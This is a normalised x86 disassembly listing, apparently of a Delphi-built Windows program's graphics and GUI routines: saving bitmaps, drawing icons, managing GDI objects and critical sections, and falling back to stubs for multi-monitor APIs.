mov eax [ eax + 0x14 ]
mov edx edi
call sub_4265d0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_422a10
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_428400
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a6c
call sub_403ac0
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4265d0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428438
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_427734
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_427140
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428494
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402ca4
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4276b0
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_425acc
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41aac4
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41aac4
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402ca4
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_427574
mov dl [ r-xdata ]
call sub_424988
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_424ca0
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_42668c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41aac4
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41aac4
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41aac4
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41aac4
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41aac4
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41aac4
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425110
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41aac4
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_425434
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_428754
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_427734
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4266d8
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4287ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_426d3c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4287f4
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42883c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425e08
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_426504
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_428890
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_426508
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4188e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_4288c0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_428b98
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_426504
mov eax [ esi + 0x28 ]
call sub_426508
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41890c
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_428920
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_424988
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_428978
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_4289b4
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41a880
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41aa8c
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4256e0
jmp r-xdata
jmp r-xdata
call sub_424b98
sub_428a2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428ab9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_428978
cmp eax [ rw-data ]
jne r-xdata
call sub_424b98
mov eax esi
call sub_428978
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_425c0c
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402ca4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41aac4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428ae0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428b6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41a860
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41aa8c
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41aa8c
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_428b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_424b98
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428b73
mov eax [ ebp - 0x4 ]
call sub_403290
call sub_403a6c
call sub_403ac0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428b98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428bd8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_426504
mov eax [ ebx + 0x28 ]
call sub_426508
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428c58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_428a2c
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41aac4
pop esi
pop ebx
retn
sub_428ca8
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_4251e0
mov [ rw-data ] eax
pop ebx
retn
sub_428ce0
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_428d24
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_428ce0
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_428df0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_428e28
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_429020
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_428e6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_428e54
xor eax eax
push ebp
push sub_428f0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428f14
mov eax [ ebp - 0x4 ]
call sub_428e60
retn
mov eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_428f20
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_428f20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428fff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_427574
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_4240d0
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_423fb4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416cd4
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_4243a0
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_42486c
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_427230
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429020
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_428e54
xor eax eax
push ebp
push sub_42906b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429072
mov eax [ ebp - 0x4 ]
call sub_428e60
retn
mov esp ebp
pop ebp
retn
sub_429072
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403290
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_428e54
xor eax eax
push ebp
push sub_42906b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429072
mov eax [ ebp - 0x4 ]
call sub_428e60
retn
mov esp ebp
pop ebp
retn
sub_429098
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4232e0
push eax
mov eax ebx
call sub_4232e0
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_428e6c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4290d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429199
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4291a0
retn
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
call sub_4261e8
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a84
sub_4291a4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_428ca8
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_428d24
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_422a98
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_422a98
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_422a98
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428df0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41857c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41857c
mov [ rw-data ] eax
mov ecx sub_423338
mov edx sub_423348
mov eax [ sub_421d60 ]
call sub_417ad0
mov ecx r-xdata
mov edx sub_423550
mov eax [ r-xdata ]
call sub_417ad0
sub_4292b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4292d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4292dc
retn
sub_429418
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_429470
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418578
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403290
sub_4294b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4294f8
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_42953c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418200
mov eax esi
pop esi
pop ebx
retn
sub_429568
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42958d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429594
retn
sub_4295a8
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_429608
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4295a8
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_4296f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1203
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429794
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x100a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4297c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1012
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4297ec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429811
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429818
retn
sub_429824
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_4298e3
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4298ea
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_429824
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404008
sub_42990c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_429824
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_429994
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_429824
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_429a24
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_429824
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
